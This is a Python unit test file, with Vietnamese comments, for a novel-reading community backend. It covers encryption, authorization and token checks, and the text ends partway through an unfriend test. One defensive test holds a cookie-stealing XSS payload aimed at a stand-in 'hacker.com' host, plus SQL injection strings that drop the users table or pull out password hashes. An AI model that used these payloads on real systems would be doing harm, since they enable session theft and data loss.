import unittest
import os
import sys
import shutil
import base64
import hashlib
from datetime import datetime

# Thêm root dự án vào sys.path để import chính xác các module
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# Thiết lập môi trường TEST sạch sẽ để không ghi đè DB thật
os.environ["USE_LOCAL_SQLITE"] = "true"
os.environ["USER_DB_PATH"] = "test_users_data_security.db"

from backend import create_app
from backend.database.db_manager import get_user_db_conn
from backend.core.security import (
    hash_password, verify_password, 
    encrypt_message, decrypt_message,
    encrypt_asymmetric_hybrid, decrypt_asymmetric_hybrid,
    get_or_create_rsa_keys, PRIVATE_KEY_PATH, PUBLIC_KEY_PATH,
    create_access_token
)

class TestOneWayPasswordHashing(unittest.TestCase):
    """Kiểm thử cơ chế băm mật khẩu một chiều và tương thích ngược."""

    def test_bcrypt_hashing_and_verification(self):
        password = "MatKhauSieuBaoMat@2026"
        hashed = hash_password(password)
        
        # Đảm bảo mật khẩu đã băm không chứa mật khẩu gốc
        self.assertNotEqual(password, hashed)
        self.assertTrue(hashed.startswith("$2b$") or hashed.startswith("$2a$"))
        
        # Xác thực mật khẩu
        self.assertTrue(verify_password(password, hashed))
        self.assertFalse(verify_password("SaiMatKhau", hashed))

    def test_legacy_sha256_compatibility(self):
        password = "LegacyPassword123"
        # Tạo mã băm SHA-256 kiểu cũ
        legacy_hash = hashlib.sha256(password.encode()).hexdigest()
        
        # Kiểm tra xem logic verify có hỗ trợ không
        self.assertTrue(verify_password(password, legacy_hash))
        self.assertFalse(verify_password("SaiMatKhau", legacy_hash))


class TestSymmetricMessageEncryption(unittest.TestCase):
    """Kiểm thử mã hóa đối xứng AES đối với tin nhắn riêng tư và tông môn."""

    def test_encrypt_decrypt_flow(self):
        secret_msg = "Nội dung chat tông môn tuyệt mật: Đột kích Ma Giáo vào giờ Tý! ⚔️"
        encrypted = encrypt_message(secret_msg)
        
        # Đảm bảo đã mã hóa hoàn toàn
        self.assertNotEqual(secret_msg, encrypted)
        self.assertTrue(encrypted.startswith("gAAAAA") or len(encrypted) > len(secret_msg))
        
        # Giải mã và so khớp bản gốc
        decrypted = decrypt_message(encrypted)
        self.assertEqual(secret_msg, decrypted)

    def test_backward_compatibility(self):
        # Tin nhắn cũ dạng clear-text
        old_msg = "Tin nhắn cũ chưa được mã hóa từ năm ngoái."
        decrypted = decrypt_message(old_msg)
        
        # Đảm bảo giải mã mượt mà không crash và trả về đúng nội dung clear-text
        self.assertEqual(old_msg, decrypted)


class TestAsymmetricHybridEncryption(unittest.TestCase):
    """Kiểm thử mã hóa lai bất đối xứng Hybrid RSA-AES cho bình luận ẩn danh."""

    @classmethod
    def setUpClass(cls):
        # Lưu trữ cặp khóa RSA hiện tại của hệ thống nếu có để phục hồi sau test
        cls.backup_dir = os.path.join(os.path.dirname(PRIVATE_KEY_PATH), "backup_test_keys")
        cls.keys_exist = os.path.exists(PRIVATE_KEY_PATH) and os.path.exists(PUBLIC_KEY_PATH)
        if cls.keys_exist:
            os.makedirs(cls.backup_dir, exist_ok=True)
            shutil.copy(PRIVATE_KEY_PATH, os.path.join(cls.backup_dir, "private_key.pem"))
            shutil.copy(PUBLIC_KEY_PATH, os.path.join(cls.backup_dir, "public_key.pem"))
            # Xóa các key hiện tại để test khả năng sinh tự động
            os.remove(PRIVATE_KEY_PATH)
            os.remove(PUBLIC_KEY_PATH)

    @classmethod
    def tearDownClass(cls):
        # Phục hồi lại các key gốc của hệ thống sau khi test xong
        if cls.keys_exist:
            shutil.copy(os.path.join(cls.backup_dir, "private_key.pem"), PRIVATE_KEY_PATH)
            shutil.copy(os.path.join(cls.backup_dir, "public_key.pem"), PUBLIC_KEY_PATH)
            shutil.rmtree(cls.backup_dir)
        elif os.path.exists(PRIVATE_KEY_PATH):
            os.remove(PRIVATE_KEY_PATH)
            os.remove(PUBLIC_KEY_PATH)

    def test_auto_key_generation(self):
        # Đảm bảo các tệp key chưa tồn tại trước khi chạy hàm sinh
        if os.path.exists(PRIVATE_KEY_PATH):
            os.remove(PRIVATE_KEY_PATH)
        if os.path.exists(PUBLIC_KEY_PATH):
            os.remove(PUBLIC_KEY_PATH)
            
        get_or_create_rsa_keys()
        
        self.assertTrue(os.path.exists(PRIVATE_KEY_PATH))
        self.assertTrue(os.path.exists(PUBLIC_KEY_PATH))

    def test_hybrid_encryption_decryption(self):
        anonymous_comment = "Bình luận ẩn danh: Truyện dịch rất hay, dịch giả dịch chương mới nhanh lên nhé! 🪷"
        
        # 1. Mã hóa
        enc_data = encrypt_asymmetric_hybrid(anonymous_comment)
        
        self.assertIn("ciphertext", enc_data)
        self.assertIn("encrypted_key", enc_data)
        self.assertIn("nonce", enc_data)
        self.assertIn("tag", enc_data)
        
        # Đảm bảo dữ liệu lưu trữ đã bị mã hóa xáo trộn hoàn toàn
        self.assertNotEqual(anonymous_comment, enc_data["ciphertext"])
        
        # 2. Giải mã
        decrypted = decrypt_asymmetric_hybrid(
            enc_data["ciphertext"],
            enc_data["encrypted_key"],
            enc_data["nonce"],
            enc_data["tag"]
        )
        
        self.assertEqual(anonymous_comment, decrypted)

    def test_db_leak_simulation_without_private_key(self):
        """Mô phỏng hành vi rò rỉ database: Nếu hacker có DB nhưng không có Private Key RSA thì không thể giải mã."""
        comment = "Tông môn bí mật truyền âm!"
        enc_data = encrypt_asymmetric_hybrid(comment)
        
        # Tạm thời đổi tên Private Key để giả lập hacker không có Private Key
        temp_private_path = PRIVATE_KEY_PATH + ".tmp"
        shutil.move(PRIVATE_KEY_PATH, temp_private_path)
        
        try:
            # Cố gắng giải mã khi thiếu Private Key (hàm sẽ báo lỗi và trả về chuỗi rỗng)
            decrypted = decrypt_asymmetric_hybrid(
                enc_data["ciphertext"],
                enc_data["encrypted_key"],
                enc_data["nonce"],
                enc_data["tag"]
            )
            self.assertEqual(decrypted, "")
            print("\n🛡️  [AN TOÀN MẠNG] Đã xác minh: Hacker lấy được cơ sở dữ liệu bình luận nhưng không thể giải mã do thiếu Private Key RSA!")
        finally:
            # Khôi phục Private Key
            shutil.move(temp_private_path, PRIVATE_KEY_PATH)


class TestNetworkProtocolSecurity(unittest.TestCase):
    """Kiểm thử tích hợp qua Flask Test Client (Giao thức mạng, các API key, mã hóa chat, bình luận ẩn danh)."""

    @classmethod
    def setUpClass(cls):
        # Thiết lập Flask App cho Testing
        cls.app = create_app()
        cls.app.config['TESTING'] = True
        cls.client = cls.app.test_client()

        # Tạo DB test sạch sẽ
        conn = get_user_db_conn()
        try:
            # Xóa các bảng cũ nếu tồn tại
            conn.execute("DROP TABLE IF EXISTS users")
            conn.execute("DROP TABLE IF EXISTS direct_messages")
            conn.execute("DROP TABLE IF EXISTS friendships")
            conn.execute("DROP TABLE IF EXISTS sect_join_requests")
            conn.execute("DROP TABLE IF EXISTS sects")
            conn.execute("DROP TABLE IF EXISTS sect_members")
            conn.execute("DROP TABLE IF EXISTS sect_messages")
            conn.execute("DROP TABLE IF EXISTS book_comments")
            
            # Khởi tạo lại toàn bộ schema
            from backend.database.db_manager import _init_db_schema_for_conn
            _init_db_schema_for_conn(conn)
            
            # Gieo dữ liệu giả lập (mồi)
            # 1. Tạo các user chính thức và tài khoản clone phục vụ test bảo mật
            conn.execute(
                "INSERT INTO users (id, username, password_hash, vip_status, user_code) VALUES (?, ?, ?, ?, ?)",
                (999, "sender_dao_huu", hash_password("pass123"), 1, "9999999")
            )
            conn.execute(
                "INSERT INTO users (id, username, password_hash, vip_status, user_code) VALUES (?, ?, ?, ?, ?)",
                (888, "receiver_dao_huu", hash_password("pass123"), 0, "8888888")
            )
            conn.execute(
                "INSERT INTO users (id, username, password_hash, vip_status, user_code) VALUES (?, ?, ?, ?, ?)",
                (111, "clone_a", hash_password("passA"), 0, "1111111")
            )
            conn.execute(
                "INSERT INTO users (id, username, password_hash, vip_status, user_code) VALUES (?, ?, ?, ?, ?)",
                (222, "clone_b", hash_password("passB"), 0, "2222222")
            )
            conn.execute(
                "INSERT INTO users (id, username, password_hash, vip_status, user_code) VALUES (?, ?, ?, ?, ?)",
                (333, "clone_c", hash_password("passC"), 0, "3333333")
            )
            # 2. Tạo tông môn và thành viên
            conn.execute(
                "INSERT INTO sects (id, name, leader_id) VALUES (?, ?, ?)",
                (1, "Thái Huyền Tông", 999)
            )
            conn.execute(
                "INSERT INTO sect_members (sect_id, user_id, role) VALUES (?, ?, ?)",
                (1, 999, "leader")
            )
            conn.commit()
        finally:
            conn.close()

    @classmethod
    def tearDownClass(cls):
        # Xóa file DB test sau khi hoàn tất test
        if os.path.exists("test_users_data_security.db"):
            os.remove("test_users_data_security.db")

    def setUp(self):
        # Tạo JWT token giả lập cho test client
        self.token = create_access_token(user_id=999, username="sender_dao_huu", vip_status=1)
        self.headers = {
            "Authorization": f"Bearer {self.token}",
            "Content-Type": "application/json"
        }

    def test_direct_message_api_encryption(self):
        """Test API gửi/nhận tin nhắn riêng tư: Dữ liệu mạng qua API được truyền/nhận chuẩn, nhưng lưu DB phải được mã hóa."""
        message_text = "Nội dung chat riêng tư nhạy cảm: Chìa khóa mật thất ở dưới chân tượng Phật!"
        
        # 1. Gửi tin nhắn qua giao thức mạng POST API
        response = self.client.post(
            "/api/messages/send",
            headers=self.headers,
            json={"receiver_id": 888, "message": message_text}
        )
        self.assertEqual(response.status_code, 200)
        self.assertTrue(response.json["success"])
        
        # 2. Kiểm tra trực tiếp trong DB: Dữ liệu phải bị mã hóa, không lưu clear-text
        conn = get_user_db_conn()
        row = conn.execute("SELECT message FROM direct_messages WHERE sender_id = 999 AND receiver_id = 888").fetchone()
        conn.close()
        
        self.assertIsNotNone(row)
        db_message = row["message"]
        self.assertNotEqual(message_text, db_message)
        self.assertTrue(db_message.startswith("gAAAAA"))  # Tiền tố mã hóa Fernet

        # 3. Lấy lịch sử chat qua GET API: Bản tin trả về phải được giải mã tự động
        response_history = self.client.get(
            "/api/messages/chat/888",
            headers=self.headers
        )
        self.assertEqual(response_history.status_code, 200)
        messages_list = response_history.json.get("messages", [])
        
        # Đảm bảo tin nhắn đã được giải mã chính xác khi trả về client
        found = False
        for msg in messages_list:
            if msg["sender_id"] == 999 and msg["receiver_id"] == 888:
                self.assertEqual(msg["message"], message_text)
                found = True
        self.assertTrue(found)

    def test_sect_chat_api_encryption(self):
        """Test API gửi/nhận chat tông môn: Mã hóa trong DB và giải mã tự động khi qua giao thức mạng GET."""
        sect_message = "Mật lệnh Tông Môn: Tập hợp toàn bộ đệ tử tại quảng trường!"
        
        # 1. Gửi chat tông môn qua POST API
        response = self.client.post(
            "/api/sects/chat/send",
            headers=self.headers,
            json={"message": sect_message, "chat_type": "general"}
        )
        self.assertEqual(response.status_code, 200)
        
        # 2. Kiểm tra trong DB: Đảm bảo được mã hóa bảo mật
        conn = get_user_db_conn()
        row = conn.execute("SELECT message FROM sect_messages WHERE sender_id = 999").fetchone()
        conn.close()
        
        self.assertIsNotNone(row)
        db_message = row["message"]
        self.assertNotEqual(sect_message, db_message)
        self.assertTrue(db_message.startswith("gAAAAA"))

        # 3. Lấy lịch sử chat tông môn qua GET API
        response_history = self.client.get(
            "/api/sects/chat/history",
            headers=self.headers
        )
        self.assertEqual(response_history.status_code, 200)
        
        found = False
        messages_list = response_history.json.get("messages", [])
        for msg in messages_list:
            if msg["sender_id"] == 999:
                self.assertEqual(msg["message"], sect_message)
                found = True
        self.assertTrue(found)

    def test_anonymous_book_comment_hybrid_encryption(self):
        """Test API bình luận ẩn danh: Mã hóa bất đối xứng Hybrid RSA-AES cho nội dung, ẩn danh thông tin tác giả."""
        comment_content = "Đọc truyện này giúp ngộ ra nhân sinh đế vương đạo!"
        book_id = 42
        
        # 1. Gửi bình luận ẩn danh qua POST API (is_anonymous = 1)
        response = self.client.post(
            f"/api/books/{book_id}/comments",
            headers=self.headers,
            json={"content": comment_content, "is_anonymous": 1}
        )
        self.assertEqual(response.status_code, 200)
        self.assertTrue(response.json["success"])

        # 2. Kiểm tra DB: Đảm bảo nội dung được mã hóa lai và các khóa AES được lưu trữ chuẩn RSA
        conn = get_user_db_conn()
        row = conn.execute("SELECT content_ciphertext, encrypted_aes_key, aes_nonce, aes_tag FROM book_comments WHERE book_id = ?", (book_id,)).fetchone()
        conn.close()
        
        self.assertIsNotNone(row)
        self.assertNotEqual(comment_content, row["content_ciphertext"])
        # Kiểm tra xem các khóa, nonce và tag được lưu trữ ở định dạng base64 hợp lệ hay không
        self.assertTrue(len(base64.b64decode(row["encrypted_aes_key"])) > 0)
        self.assertEqual(len(base64.b64decode(row["aes_nonce"])), 12)  # Nonce cho AES-GCM phải đúng 12 bytes
        self.assertEqual(len(base64.b64decode(row["aes_tag"])), 16)    # Tag cho AES-GCM phải đúng 16 bytes

        # 3. Lấy danh sách bình luận qua GET API
        response_get = self.client.get(f"/api/books/{book_id}/comments")
        self.assertEqual(response_get.status_code, 200)
        
        comments_list = response_get.json.get("comments", [])
        self.assertEqual(len(comments_list), 1)
        
        # Đảm bảo bình luận đã được giải mã đúng bản gốc
        self.assertEqual(comments_list[0]["content"], comment_content)
        # Đảm bảo người dùng bị ẩn danh hoàn toàn khi trả về client
        self.assertEqual(comments_list[0]["username"], "Đạo hữu ẩn danh")
        self.assertIsNone(comments_list[0]["user_id"])
        self.assertIsNone(comments_list[0]["avatar"])


class TestCommunitySecurityOperations(unittest.TestCase):
    """Kiểm thử bảo mật cộng đồng nâng cao: Kết bạn clone, nhắn tin mã hóa, phòng chống XSS/SQLi, phân quyền tông môn."""

    @classmethod
    def setUpClass(cls):
        cls.app = create_app()
        cls.app.config['TESTING'] = True
        cls.client = cls.app.test_client()

        # Tạo DB test sạch sẽ
        conn = get_user_db_conn()
        try:
            conn.execute("DROP TABLE IF EXISTS users")
            conn.execute("DROP TABLE IF EXISTS direct_messages")
            conn.execute("DROP TABLE IF EXISTS friendships")
            conn.execute("DROP TABLE IF EXISTS sect_join_requests")
            conn.execute("DROP TABLE IF EXISTS sects")
            conn.execute("DROP TABLE IF EXISTS sect_members")
            conn.execute("DROP TABLE IF EXISTS sect_messages")
            conn.execute("DROP TABLE IF EXISTS book_comments")
            conn.execute("DROP TABLE IF EXISTS personal_notifications")

            from backend.database.db_manager import _init_db_schema_for_conn
            _init_db_schema_for_conn(conn)

            # Gieo dữ liệu: Tông chủ + 3 clone accounts
            conn.execute(
                "INSERT INTO users (id, username, password_hash, vip_status, user_code) VALUES (?, ?, ?, ?, ?)",
                (999, "tong_chu", hash_password("pass123"), 1, "9999999")
            )
            conn.execute(
                "INSERT INTO users (id, username, password_hash, vip_status, user_code) VALUES (?, ?, ?, ?, ?)",
                (111, "clone_a", hash_password("passA"), 0, "1111111")
            )
            conn.execute(
                "INSERT INTO users (id, username, password_hash, vip_status, user_code) VALUES (?, ?, ?, ?, ?)",
                (222, "clone_b", hash_password("passB"), 0, "2222222")
            )
            conn.execute(
                "INSERT INTO users (id, username, password_hash, vip_status, user_code) VALUES (?, ?, ?, ?, ?)",
                (333, "clone_c", hash_password("passC"), 0, "3333333")
            )
            # Tông môn Thái Huyền Tông do User 999 làm tông chủ
            conn.execute(
                "INSERT INTO sects (id, name, leader_id) VALUES (?, ?, ?)",
                (1, "Thái Huyền Tông", 999)
            )
            conn.execute(
                "INSERT INTO sect_members (sect_id, user_id, role) VALUES (?, ?, ?)",
                (1, 999, "leader")
            )
            conn.commit()
        finally:
            conn.close()

        # Tạo sẵn JWT token cho mỗi user
        cls.token_leader = create_access_token(user_id=999, username="tong_chu", vip_status=1)
        cls.token_a = create_access_token(user_id=111, username="clone_a", vip_status=0)
        cls.token_b = create_access_token(user_id=222, username="clone_b", vip_status=0)
        cls.token_c = create_access_token(user_id=333, username="clone_c", vip_status=0)

        cls.headers_leader = {"Authorization": f"Bearer {cls.token_leader}", "Content-Type": "application/json"}
        cls.headers_a = {"Authorization": f"Bearer {cls.token_a}", "Content-Type": "application/json"}
        cls.headers_b = {"Authorization": f"Bearer {cls.token_b}", "Content-Type": "application/json"}
        cls.headers_c = {"Authorization": f"Bearer {cls.token_c}", "Content-Type": "application/json"}

    @classmethod
    def tearDownClass(cls):
        if os.path.exists("test_users_data_security.db"):
            os.remove("test_users_data_security.db")

    # =====================================================
    # TEST 1: Quy trình cộng đồng Clone — Kết bạn & Chat
    # =====================================================
    def test_01_community_clone_friend_request_and_encrypted_chat(self):
        """Kịch bản: Clone A gửi lời mời kết bạn Clone B → Clone B chấp nhận → Nhắn tin mã hóa đối xứng AES."""
        print("\n🤝 [TEST] Clone A kết bạn Clone B & nhắn tin mã hóa...")

        # 1. Clone A gửi yêu cầu kết bạn cho Clone B (tìm bằng user_code)
        res = self.client.post("/api/friends/request", headers=self.headers_a,
                               json={"friend_code": "2222222"})
        self.assertEqual(res.status_code, 200)
        self.assertTrue(res.json["success"])
        print("   ✅ Clone A → gửi yêu cầu kết bạn thành công")

        # 2. Clone A thử gửi yêu cầu trùng → phải bị chặn
        res_dup = self.client.post("/api/friends/request", headers=self.headers_a,
                                   json={"friend_code": "2222222"})
        self.assertEqual(res_dup.status_code, 400)
        print("   ✅ Chặn yêu cầu kết bạn trùng lặp")

        # 3. Clone A thử kết bạn chính mình → phải bị chặn
        res_self = self.client.post("/api/friends/request", headers=self.headers_a,
                                    json={"friend_code": "1111111"})
        self.assertEqual(res_self.status_code, 400)
        print("   ✅ Chặn kết bạn với chính mình")

        # 4. Clone B chấp nhận lời mời kết bạn
        res_accept = self.client.post("/api/friends/respond", headers=self.headers_b,
                                      json={"sender_id": 111, "action": "accept"})
        self.assertEqual(res_accept.status_code, 200)
        self.assertTrue(res_accept.json["success"])
        print("   ✅ Clone B chấp nhận kết bạn")

        # 5. Xác minh danh sách bạn bè của Clone A chứa Clone B
        res_list = self.client.get("/api/friends/list", headers=self.headers_a)
        self.assertEqual(res_list.status_code, 200)
        friends_a = res_list.json.get("friends", [])
        self.assertTrue(any(f["id"] == 222 for f in friends_a))
        print("   ✅ Danh sách bạn bè Clone A có chứa Clone B")

        # 6. Clone A gửi tin nhắn mật cho Clone B
        secret_msg = "Mật chỉ: Tối nay 9 giờ họp mặt tại tửu lâu! 🏮"
        res_send = self.client.post("/api/messages/send", headers=self.headers_a,
                                    json={"receiver_id": 222, "message": secret_msg})
        self.assertEqual(res_send.status_code, 200)
        self.assertTrue(res_send.json["success"])
        print("   ✅ Clone A gửi tin nhắn mật thành công")

        # 7. Kiểm tra trực tiếp DB: phải là chuỗi mã hóa Fernet, không phải clear-text
        conn = get_user_db_conn()
        row = conn.execute("SELECT message FROM direct_messages WHERE sender_id = 111 AND receiver_id = 222").fetchone()
        conn.close()
        self.assertIsNotNone(row)
        self.assertNotEqual(secret_msg, row["message"])
        self.assertTrue(row["message"].startswith("gAAAAA"))
        print("   ✅ DB: Tin nhắn đã được mã hóa AES (Fernet) — không có clear-text")

        # 8. Clone B đọc tin nhắn → API tự động giải mã
        res_chat = self.client.get("/api/messages/chat/111", headers=self.headers_b)
        self.assertEqual(res_chat.status_code, 200)
        msgs = res_chat.json.get("messages", [])
        self.assertTrue(any(m["message"] == secret_msg for m in msgs))
        print("   ✅ Clone B nhận tin nhắn giải mã chính xác qua API")

    # =====================================================
    # TEST 2: Phòng chống tấn công XSS & SQL Injection
    # =====================================================
    def test_02_xss_and_sql_injection_defense(self):
        """Kịch bản: Gửi payload XSS và SQL Injection qua chat & comment — hệ thống phải xử lý an toàn."""
        print("\n🛡️  [TEST] Phòng chống XSS & SQL Injection...")

        # --- XSS qua tin nhắn ---
        xss_payload = "<script>fetch('http://hacker.com/steal?cookie='+document.cookie)</script>"
        res_xss = self.client.post("/api/messages/send", headers=self.headers_a,
                                   json={"receiver_id": 222, "message": xss_payload})
        self.assertEqual(res_xss.status_code, 200)
        print("   ✅ XSS payload gửi thành công (lưu an toàn dưới dạng mã hóa)")

        # Giải mã qua API → nội dung trả về chính xác là chuỗi thô, không thực thi
        res_chat = self.client.get("/api/messages/chat/222", headers=self.headers_a)
        msgs = res_chat.json.get("messages", [])
        xss_found = any(m["message"] == xss_payload for m in msgs)
        self.assertTrue(xss_found)
        print("   ✅ API trả về nguyên bản chuỗi XSS (không thực thi) — client chịu trách nhiệm escape")

        # --- SQL Injection qua tin nhắn ---
        sqli_payload = "'; DROP TABLE users; --"
        res_sqli = self.client.post("/api/messages/send", headers=self.headers_a,
                                    json={"receiver_id": 222, "message": sqli_payload})
        self.assertEqual(res_sqli.status_code, 200)
        print("   ✅ SQL Injection payload gửi thành công (parameterized query an toàn)")

        # Xác minh bảng users vẫn còn tồn tại (chưa bị DROP)
        conn = get_user_db_conn()
        user_count = conn.execute("SELECT COUNT(*) FROM users").fetchone()[0]
        conn.close()
        self.assertGreaterEqual(user_count, 4)
        print(f"   ✅ Bảng users vẫn an toàn ({user_count} bản ghi) — SQL Injection thất bại!")

        # --- SQL Injection qua bình luận ẩn danh ---
        sqli_comment = "' UNION SELECT username, password_hash FROM users --"
        res_comment = self.client.post("/api/books/99/comments", headers=self.headers_a,
                                       json={"content": sqli_comment, "is_anonymous": 1})
        self.assertEqual(res_comment.status_code, 200)
        self.assertTrue(res_comment.json["success"])
        print("   ✅ SQL Injection qua bình luận ẩn danh: Lưu an toàn (Hybrid RSA-AES)")

        # Xác minh bình luận GET trả về đúng nội dung giải mã, không rò rỉ dữ liệu users
        res_get = self.client.get("/api/books/99/comments")
        self.assertEqual(res_get.status_code, 200)
        comments = res_get.json.get("comments", [])
        self.assertEqual(len(comments), 1)
        self.assertEqual(comments[0]["content"], sqli_comment)
        self.assertEqual(comments[0]["username"], "Đạo hữu ẩn danh")
        print("   ✅ GET bình luận: Trả về nội dung gốc, không rò rỉ bảng users")

        # --- Tấn công overflow/spam: tin nhắn siêu dài ---
        mega_msg = "A" * 50000
        res_mega = self.client.post("/api/messages/send", headers=self.headers_a,
                                    json={"receiver_id": 222, "message": mega_msg})
        self.assertIn(res_mega.status_code, [200, 400, 413])
        print(f"   ✅ Tin nhắn 50,000 ký tự: Status {res_mega.status_code} — hệ thống xử lý an toàn")

    # =====================================================
    # TEST 3: Phân quyền Tông môn — Gia nhập, Chat, Kick
    # =====================================================
    def test_03_sect_authorization_join_chat_kick(self):
        """Kịch bản: Clone C (ngoại nhân) cố chat/hack tông môn → xin gia nhập → được duyệt → bị trục xuất."""
        print("\n⚔️  [TEST] Phân quyền tông môn nâng cao...")

        # 1. Clone C chưa gia nhập tông môn → cố gửi chat tông môn → phải bị chặn 403
        res_chat_unauth = self.client.post("/api/sects/chat/send", headers=self.headers_c,
                                           json={"message": "Ta muốn xâm nhập!", "chat_type": "general"})
        self.assertEqual(res_chat_unauth.status_code, 403)
        print("   ✅ Chặn Clone C (ngoại nhân) gửi chat tông môn — 403 Forbidden")

        # 2. Clone C xin gia nhập Thái Huyền Tông
        res_join = self.client.post("/api/sects/join", headers=self.headers_c,
                                    json={"sect_id": 1})
        self.assertEqual(res_join.status_code, 200)
        print("   ✅ Clone C gửi yêu cầu gia nhập tông môn thành công")

        # 3. Clone B (người ngoài, chưa phải leader/elder) cố duyệt yêu cầu → phải bị chặn 403
        res_reqs_leader = self.client.get("/api/sects/requests/list", headers=self.headers_leader)
        self.assertEqual(res_reqs_leader.status_code, 200)
        requests_list = res_reqs_leader.json.get("requests", [])
        clone_c_reqs = [r for r in requests_list if r["user_id"] == 333]
        self.assertTrue(len(clone_c_reqs) > 0)
        req_id = clone_c_reqs[0]["id"]

        res_approve_unauth = self.client.post("/api/sects/requests/respond", headers=self.headers_b,
                                              json={"request_id": req_id, "action": "approve"})
        self.assertEqual(res_approve_unauth.status_code, 403)
        print("   ✅ Chặn Clone B (không phải leader/elder) duyệt yêu cầu — 403")

        # 4. Tông chủ duyệt yêu cầu gia nhập của Clone C
        res_approve = self.client.post("/api/sects/requests/respond", headers=self.headers_leader,
                                       json={"request_id": req_id, "action": "approve"})
        self.assertEqual(res_approve.status_code, 200)
        self.assertTrue(res_approve.json["success"])
        print("   ✅ Tông chủ duyệt yêu cầu gia nhập Clone C thành công")

        # 5. Clone C giờ có thể gửi chat tông môn
        res_chat_ok = self.client.post("/api/sects/chat/send", headers=self.headers_c,
                                       json={"message": "Clone C kính chào toàn thể tông môn! 🙏", "chat_type": "general"})
        self.assertEqual(res_chat_ok.status_code, 200)
        print("   ✅ Clone C (đệ tử mới) gửi chat tông môn thành công")

        # 6. Kiểm tra DB: tin nhắn tông môn của Clone C phải được mã hóa
        conn = get_user_db_conn()
        row = conn.execute("SELECT message FROM sect_messages WHERE sender_id = 333").fetchone()
        conn.close()
        self.assertIsNotNone(row)
        self.assertTrue(row["message"].startswith("gAAAAA"))
        print("   ✅ DB: Chat tông môn của Clone C đã mã hóa AES (Fernet)")

        # 7. Clone C (thành viên thường) cố trục xuất Tông chủ → phải bị chặn 403
        res_kick_leader = self.client.post("/api/sects/kick", headers=self.headers_c,
                                           json={"user_id": 999})
        self.assertEqual(res_kick_leader.status_code, 403)
        print("   ✅ Chặn Clone C (đệ tử thường) trục xuất Tông chủ — 403")

        # 8. Tông chủ trục xuất Clone C thành công
        res_kick = self.client.post("/api/sects/kick", headers=self.headers_leader,
                                    json={"user_id": 333})
        self.assertEqual(res_kick.status_code, 200)
        self.assertTrue(res_kick.json["success"])
        print("   ✅ Tông chủ trục xuất Clone C thành công")

        # 9. Sau khi bị trục xuất, Clone C không thể chat tông môn nữa → 403
        res_chat_after_kick = self.client.post("/api/sects/chat/send", headers=self.headers_c,
                                               json={"message": "Còn ai nhớ ta không?", "chat_type": "general"})
        self.assertEqual(res_chat_after_kick.status_code, 403)
        print("   ✅ Clone C bị trục xuất → không thể chat tông môn — 403")

    # =====================================================
    # TEST 4: Token giả mạo & Truy cập không xác thực
    # =====================================================
    def test_04_forged_token_and_unauthenticated_access(self):
        """Kịch bản: Sử dụng token giả mạo/hết hạn/không có token để truy cập API bảo mật."""
        print("\n🔐 [TEST] Token giả mạo & truy cập không xác thực...")

        # 1. Không gửi token → phải bị 401
        res_no_token = self.client.get("/api/friends/list")
        self.assertEqual(res_no_token.status_code, 401)
        print("   ✅ Chặn truy cập không có token — 401")

        # 2. Token giả mạo (chuỗi bịa)
        fake_headers = {"Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.fake.payload",
                        "Content-Type": "application/json"}
        res_fake = self.client.post("/api/messages/send", headers=fake_headers,
                                    json={"receiver_id": 222, "message": "hack!"})
        self.assertEqual(res_fake.status_code, 401)
        print("   ✅ Chặn token giả mạo — 401")

        # 3. Token rỗng
        empty_headers = {"Authorization": "Bearer ", "Content-Type": "application/json"}
        res_empty = self.client.get("/api/friends/list", headers=empty_headers)
        self.assertEqual(res_empty.status_code, 401)
        print("   ✅ Chặn token rỗng — 401")

        # 4. Token không đúng định dạng Bearer
        bad_headers = {"Authorization": "Basic abc123", "Content-Type": "application/json"}
        res_bad = self.client.post("/api/friends/request", headers=bad_headers,
                                   json={"friend_code": "1111111"})
        self.assertEqual(res_bad.status_code, 401)
        print("   ✅ Chặn Authorization header sai định dạng — 401")


class TestUnfriendBlockSecurity(unittest.TestCase):
    """Kiểm thử bảo mật đầy đủ: Hủy kết bạn, Chặn/Bỏ chặn user, Nhắn tin sau block."""

    @classmethod
    def setUpClass(cls):
        cls.app = create_app()
        cls.app.config['TESTING'] = True
        cls.client = cls.app.test_client()

        conn = get_user_db_conn()
        try:
            conn.execute("DROP TABLE IF EXISTS users")
            conn.execute("DROP TABLE IF EXISTS direct_messages")
            conn.execute("DROP TABLE IF EXISTS friendships")
            conn.execute("DROP TABLE IF EXISTS personal_notifications")

            from backend.database.db_manager import _init_db_schema_for_conn
            _init_db_schema_for_conn(conn)

            # 4 người dùng: A, B, C, D
            users = [
                (1, "user_a", "A@code", hash_password("passA")),
                (2, "user_b", "B@code", hash_password("passB")),
                (3, "user_c", "C@code", hash_password("passC")),
                (4, "user_d", "D@code", hash_password("passD")),
            ]
            for uid, uname, ucode, uhash in users:
                conn.execute(
                    "INSERT INTO users (id, username, user_code, password_hash, vip_status) VALUES (?, ?, ?, ?, 0)",
                    (uid, uname, ucode, uhash)
                )
            # Gieo sẵn quan hệ bạn bè accepted giữa A-B và A-C
            for u1, u2 in [(1, 2), (2, 1), (1, 3), (3, 1)]:
                conn.execute(
                    "INSERT INTO friendships (user_id, friend_id, status) VALUES (?, ?, 'accepted')",
                    (u1, u2)
                )
            conn.commit()
        finally:
            conn.close()

        cls.tok_a = create_access_token(user_id=1, username="user_a", vip_status=0)
        cls.tok_b = create_access_token(user_id=2, username="user_b", vip_status=0)
        cls.tok_c = create_access_token(user_id=3, username="user_c", vip_status=0)
        cls.tok_d = create_access_token(user_id=4, username="user_d", vip_status=0)

        cls.hdra = {"Authorization": f"Bearer {cls.tok_a}", "Content-Type": "application/json"}
        cls.hdrb = {"Authorization": f"Bearer {cls.tok_b}", "Content-Type": "application/json"}
        cls.hdrc = {"Authorization": f"Bearer {cls.tok_c}", "Content-Type": "application/json"}
        cls.hdrd = {"Authorization": f"Bearer {cls.tok_d}", "Content-Type": "application/json"}

    @classmethod
    def tearDownClass(cls):
        if os.path.exists("test_users_data_security.db"):
            os.remove("test_users_data_security.db")

    # ----------------------------------------------------------
    # TEST 5: Hủy kết bạn & kiểm tra phân quyền nhắn tin
    # ----------------------------------------------------------
    def test_05_unfriend_flow(self):
        """A hủy kết bạn B → A vẫn nhắn tin được (vì không block) → B cũng vẫn nhắn được."""
        print("\n💔 [TEST] Hủy kết bạn (unfriend)...")

        # 1. Xác nhận ban đầu A và B là bạn
        res_list = self.client.get("/api/friends/list", headers=self.hdra)
        friends_before = [f["id"] for f in res_list.json.get("friends", [])]
        self.assertIn(2, friends_before)
        print("   ✅ Trước unfriend: A và B là bạn")

        # 2. A hủy kết bạn B
